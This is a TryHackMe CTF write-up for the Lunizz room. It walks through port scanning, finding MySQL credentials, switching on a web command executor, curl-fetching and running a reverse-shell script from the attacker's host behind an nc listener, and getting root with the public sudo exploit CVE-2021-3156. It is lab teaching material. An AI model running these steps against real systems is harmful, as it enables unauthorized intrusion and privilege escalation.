---
layout: post
title:  "TryHackMe - Lunizz CTF"
date:   2021-02-26 12:06:00 +0100
categories: [ctf, writeups, tryhackme]
---

Link to the ctf: [Lunizz CTF](https://tryhackme.com/room/lunizzctfnd)

```
# Nmap 7.80 scan initiated Wed Feb 24 23:41:07 2021 as: nmap -sV -sC -p- -T4 -oN nmap.log 10.10.115.79
Nmap scan report for 10.10.115.79
Host is up (0.087s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f8:08:db:be:ed:80:d1:ef:a4:b0:a9:e8:2d:e2:dc:ee (RSA)
|   256 79:01:d6:df:8b:0a:6e:ad:b7:d8:59:9a:94:0a:09:7a (ECDSA)
|_  256 b1:a9:ef:bb:7e:5b:01:cd:4c:8e:6b:bf:56:5d:a7:f4 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql   MySQL 5.7.32-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.32-0ubuntu0.18.04.1
|   Thread ID: 3
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, ConnectWithDatabase, FoundRows, IgnoreSigpipes, SupportsTransactions, LongPassword, ODBCClient, SwitchToSSLAfterHandshake, InteractiveClient, LongColumnFlag, SupportsCompression, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, SupportsLoadDataLocal, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: `|lXPJ\x1CK5G";6\x10y
| Nq@Z
|_  Auth Plugin Name: mysql_native_password
4444/tcp open  krb524?
| fingerprint-strings: 
|   GetRequest: 
|     Can you decode this for me?
|     bGV0bWVpbg==
|     Wrong Password
|   NULL, SSLSessionReq: 
|     Can you decode this for me?
|_    bGV0bWVpbg==
5000/tcp open  upnp?
| fingerprint-strings: 
|   NULL: 
|     OpenSSH 5.1
|_    Unable to load config info from /usr/local/ssl/openssl.cnf
```

| Port | Service | 
| ---- | ------- |
| 22   | SSH     |
| 80   | HTTP    |
| 3306 | MySQL   |


# Initial foothold
By using `dirsearch` with the wordlist `SecLists/Discovery/Web-Content/raft-large-files.txt` the webserver, we found a file called `instructions.txt`
![](/assets/Clipboard_2021-02-25-01-55-03.png)

```
Made By CTF_SCRIPTS_CAVE (not real)

Thanks for installing our ctf script

#Steps
- Create a mysql user ([REDACTED]:[REDACTED])
- Change necessary lines of config.php file

Done you can start using ctf script

#Notes
please do not use default creds (IT'S DANGEROUS) <<<<<<<<<---------------------------- READ THIS LINE PLEASE
```

In the webpage, we also found `/whatever/index.php` (again by using `dirsearch` and the wordlist `SecLists/Discovery/Web-Content/raft-large-directories.txt`) with a input field that could pontentially execute code, but it doesn't work right now.

![](/assets/Clipboard_2021-02-25-02-17-46.png)

Also the `Command Executer Mode :0` it kinda tells me that this function is disabled.

# MySQL
We can connect to `MySQL` by issuing the following command:

```bash
mysql -u USERNAME -pPASSOWRD -h VICTIM_IP
```

In the MySQL service, we have a database called `runornot`, containing a table called `run` with only one value: `0`

I tried to change the value of the row.
```sql
UPDATE runcheck SET run=1;
``` 

# Remote Code Execution
I went again to the `/whatever/index.php` and I saw that `Command Executer Mode` is set to `1`.
So tried again to use the input
![](/assets/Clipboard_2021-02-25-02-25-42.png)

And we got RCE.

I then used [asio](https://github.com/jackrendor/asio) to get a reverse shell.

```bash
asio -H MY_IP -P 8080 -A -B
```
![](/assets/Clipboard_2021-03-01-11-00-30.png)
I then created a file called `shell.sh` and put the one-liner from `asio` in it.

I opened a listener for the reverse shell.
```bash
rlwrap nc -vlp 8080
```

and then used `python3 -m http.server` to create a webserver.
> NOTE: the command MUST run inside the same folder as `shell.sh`

download the script on the target machine:
```bash
$(curl YOUR_IP:8000/shell.sh -o /tmp/)
```

and then execute it
```bash
bash /tmp/shell.sh
```

![](/assets/Clipboard_2021-03-01-11-38-53.png)


# Privesc
Sudo is vulnerable to the CVE-2021-3156, this is the unintentional way that I found to get root.

[CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)

I first cloned the repo on my machine where the python webserver is still running

Moving to the reverse shell: I created a folder inside `/tmp` called `privesc`, download the necessary files from the python webserver, issue `make` and then execute `sudo-hax-me-a-sandwich`
```bash
mkdir /tmp/privesc
cd /tmp/privesc
wget YOUR_IP:8000/CVE-2021-3156/Makefile
wget YOUR_IP:8000/CVE-2021-3156/hax.c
wget YOUR_IP:8000/CVE-2021-3156/lib.c
make
./sudo-hax-me-a-sandwich
```

![](/assets/Clipboard_2021-03-01-11-49-37.png)

we can check which argument we can supply to it by issuing the following command:
```bash
cat /etc/*release
```
![](/assets/Clipboard_2021-03-01-11-59-03.png)

In this way, we see that the version of Ubuntu is `18.04.5 LTS (Bionic Beaver)` so accordingly to `sudo-hax-me-a-sandwich`, we have to supply the argument `0`

![](/assets/Clipboard_2021-03-01-12-01-15.png)

and we got root.
